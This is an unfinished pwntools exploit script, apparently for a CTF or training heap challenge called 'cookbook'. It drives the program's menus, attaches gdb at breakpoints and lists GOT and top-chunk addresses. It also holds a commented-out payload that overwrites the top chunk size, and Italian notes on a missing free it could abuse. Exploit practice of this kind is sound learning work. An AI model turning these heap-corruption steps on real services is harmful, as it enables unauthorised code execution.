from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
p = process("./cookbook")
#p = remote("training.jinblack.it", 2016)
gdb.attach(p, '''
	b *0x08048bbc
	b *0x08049471
	b *0x08049277
''')
context.log_level = 'debug'

f = elf.ELF('./cookbook')
libc = elf.ELF('./libc-2.27.so')

raw_input("Wait")

#INIT

def insertName(name):
	p.recvuntil("what's your name?")
	p.sendline(name)
	time.sleep(0.1)

#initial menu
def createRecipe():
	p.recvuntil("[q]uit")
	p.sendline("c")
	time.sleep(0.1)

def giveCookBookName(dimHex, name):
	p.recvuntil("[q]uit")
	p.sendline("g")
	time.sleep(0.1)
	p.recvuntil(": ")
	p.sendline(str(dimHex))
	time.sleep(0.1)
	p.sendline("AAAA")

#recipe menu
def newRecipe():
	p.recvuntil("[q]uit")
	p.sendline("n")
	time.sleep(0.1)

def addIngredient():
	p.recvuntil("[q]uit")
	p.sendline("a")
	time.sleep(0.1)

def giveRecipeName(name):
	p.recvuntil("[q]uit")
	p.sendline("g")
	time.sleep(0.1)
	p.sendline(name)
	time.sleep(0.1)

def exitFromRecipe():
	p.recvuntil("[q]uit")
	p.sendline("q")
	time.sleep(0.1)

#non so
def newIngredient():
	p.recvuntil("[e]xport saving changes (doesn't quit)?")
	p.sendline("n")
	time.sleep(0.1)

def giveIngredientName(name):
	p.recvuntil("[e]xport saving changes (doesn't quit)?")
	p.sendline("g")
	time.sleep(0.1)
	p.sendline(name)
	time.sleep(0.1)

insertName("Davide")

printfPlt = 0x0804e004
freeGot = 0x0804d018
top_chunk = 0x0804f858

createRecipe()
newRecipe()

#cosi cambio dim top_chunk
#payload = "\xff\xff\xff\xff"*0xe1
#giveRecipeName(payload)
#exitFromRecipe()


p.interactive()

#Se nel menu di inserimento nuovo ingrediente faccio q
#esce dal menu senza fare la free dell'ingrediente in creazione